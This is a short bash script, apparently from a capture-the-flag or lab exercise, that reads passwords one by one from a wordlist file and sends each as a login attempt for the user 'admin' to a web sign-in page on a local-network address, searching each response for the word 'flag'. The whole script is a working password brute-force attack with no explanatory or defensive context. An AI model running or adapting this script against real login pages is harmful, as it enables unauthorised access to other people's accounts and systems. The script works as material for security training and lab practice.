#!/bin/bash

cat top-passwords-shortlist.txt | \
while read CMD; do
    echo $CMD
  	curl -X POST "http://192.168.0.35/index.php?page=signin&username=admin&password=${CMD}&Login=Login#" | grep 'flag'
done
